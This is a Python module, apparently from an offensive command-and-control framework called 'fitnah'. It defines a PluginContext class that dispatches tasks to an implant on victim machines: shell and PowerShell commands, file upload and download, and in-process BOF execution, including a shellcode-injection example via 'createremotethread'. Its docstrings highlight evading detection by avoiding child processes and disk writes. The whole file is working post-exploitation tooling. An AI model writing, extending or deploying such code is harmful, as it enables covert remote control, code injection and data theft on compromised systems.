"""
PluginContext — passed to every plugin's run() method.

Gives plugins a synchronous interface to dispatch commands
to the implant via the async C2 server.

Usage inside a plugin:
    def run(self, session, params, ctx=None):
        if ctx is None:
            return ModuleResult.err("No live context (offline test mode)")
        result = ctx.send("exec", {"cmd": "whoami"})
        if result["status"] != "ok":
            return ModuleResult.err(result.get("output",""))
        return ModuleResult.ok(data=result["output"])

BOF dispatch (native in-process execution, no PowerShell):
    result = ctx.bof("createremotethread", pid=1234, shellcode_b64="...")
    result = ctx.bof_raw(coff_bytes, args_b64="")
"""
from __future__ import annotations

import asyncio
import base64
import json
import logging
from pathlib import Path
from typing import TYPE_CHECKING, Any

if TYPE_CHECKING:
    from fitnah.c2.server import C2Server
    from fitnah.orchestration.session_manager import Session

log = logging.getLogger(__name__)

_BOF_ROOT = Path(__file__).resolve().parent.parent / "bofs"
_MANIFEST: dict | None = None


def _load_manifest() -> dict:
    global _MANIFEST
    if _MANIFEST is None:
        manifest_path = _BOF_ROOT / "manifest.json"
        if manifest_path.exists():
            _MANIFEST = json.loads(manifest_path.read_text())
        else:
            _MANIFEST = {}
    return _MANIFEST


class PluginContext:
    """
    Synchronous bridge between plugin logic and the async C2 dispatch layer.
    Created by the kernel for each plugin execution.
    """

    def __init__(
        self,
        session: "Session",
        c2: "C2Server",
        loop: asyncio.AbstractEventLoop,
        timeout: int = 120,
    ):
        self._session = session
        self._c2      = c2
        self._loop    = loop
        self._timeout = timeout

    def send(self, command: str, args: dict | None = None) -> dict:
        """
        Dispatch a command to the implant and block until ACK or timeout.

        Returns:
            {"status": "ok"|"error"|"timeout", "output": str, "task_id": str}
        """
        chat_id = self._session.group_id or self._session.agent_id
        coro = self._c2.dispatch(
            agent_id=self._session.agent_id,
            chat_id=chat_id,
            command=command,
            args=args or {},
        )
        future = asyncio.run_coroutine_threadsafe(coro, self._loop)
        try:
            return future.result(timeout=self._timeout)
        except TimeoutError:
            future.cancel()
            return {"status": "timeout", "output": "", "task_id": ""}
        except Exception as exc:
            future.cancel()
            log.error("[ctx] dispatch error: %s", exc)
            return {"status": "error", "output": str(exc), "task_id": ""}

    def exec(self, cmd: str) -> dict:
        """Shortcut — run a shell command."""
        return self.send("shell", {"cmd": cmd})

    def ps(self, cmd: str, timeout: int | None = None) -> dict:
        """Shortcut — run a PowerShell command (legacy; prefer bof() for evasion)."""
        old = self._timeout
        if timeout:
            self._timeout = timeout
        r = self.send("shell", {"cmd": f"powershell -NoProfile -NonInteractive -Command \"{cmd}\""})
        self._timeout = old
        return r

    def bof(self, name: str, args_b64: str = "", arch: str = "x64", timeout: int = 60) -> dict:
        """
        Dispatch a named BOF from the fitnah/bofs/ library in-process on the implant.

        The implant's BofExecute() runs the COFF in the current thread — no child
        process, no PowerShell, no disk write.  BOF output is returned in result['output'].

        Args:
            name:      BOF name as it appears in manifest.json (e.g. 'whoami', 'createremotethread')
            args_b64:  Base64-encoded packed argument buffer (BOF args_pack format). Empty = no args.
            arch:      'x64' (default) or 'x86'
            timeout:   Seconds to wait for ACK (default 60)
        """
        manifest = _load_manifest()
        entry = manifest.get(name)
        if not entry:
            return {"status": "error", "output": f"BOF not found in library: {name}"}

        bof_path = Path(__file__).resolve().parent.parent.parent / entry["path"]
        if not bof_path.exists():
            return {"status": "error", "output": f"BOF file missing: {bof_path}"}

        coff_b64 = base64.b64encode(bof_path.read_bytes()).decode()
        old_timeout = self._timeout
        self._timeout = timeout
        result = self.send("bof", {"coff_b64": coff_b64, "args_b64": args_b64})
        self._timeout = old_timeout
        return result

    def bof_raw(self, coff_bytes: bytes, args_b64: str = "", timeout: int = 60) -> dict:
        """
        Dispatch an arbitrary COFF blob in-process (no manifest lookup).
        Use this for custom BOFs not in the library.
        """
        coff_b64 = base64.b64encode(coff_bytes).decode()
        old_timeout = self._timeout
        self._timeout = timeout
        result = self.send("bof", {"coff_b64": coff_b64, "args_b64": args_b64})
        self._timeout = old_timeout
        return result

    @staticmethod
    def bof_pack(fmt: str, *values) -> str:
        """
        Pack arguments into the BOF args buffer format and return base64.

        Format chars (matches CS BOF convention):
          b  — bytes  (prefixed with uint32 length)
          i  — int32
          s  — int16
          z  — null-terminated ASCII string
          Z  — null-terminated wide string
          o  — bytes blob (prefixed with uint32 length, same as b)

        Example:
            args_b64 = ctx.bof_pack("zi", "notepad.exe", 1234)
        """
        import struct
        buf = bytearray()
        val_iter = iter(values)
        for c in fmt:
            v = next(val_iter)
            if c in ("z",):
                enc = (str(v) + "\x00").encode("utf-8")
                buf += struct.pack("<I", len(enc)) + enc
            elif c in ("Z",):
                enc = (str(v) + "\x00").encode("utf-16-le")
                buf += struct.pack("<I", len(enc)) + enc
            elif c == "i":
                buf += struct.pack("<i", int(v))
            elif c == "s":
                buf += struct.pack("<h", int(v))
            elif c in ("b", "o"):
                if isinstance(v, str):
                    v = base64.b64decode(v)
                buf += struct.pack("<I", len(v)) + bytes(v)
        return base64.b64encode(bytes(buf)).decode()

    def upload(self, remote_path: str, data: bytes) -> dict:
        """Upload bytes to a path on the victim."""
        import base64
        return self.send("upload", {
            "path": remote_path,
            "data": base64.b64encode(data).decode(),
        })

    def download(self, remote_path: str) -> dict:
        """Download a file from the victim. Returns bytes in result['bytes']."""
        return self.send("download", {"path": remote_path})

    @property
    def agent_id(self) -> str:
        return self._session.agent_id

    @property
    def hostname(self) -> str:
        return self._session.hostname

    @property
    def os(self) -> str:
        return self._session.os

    @property
    def priv(self) -> str:
        return self._session.priv_level
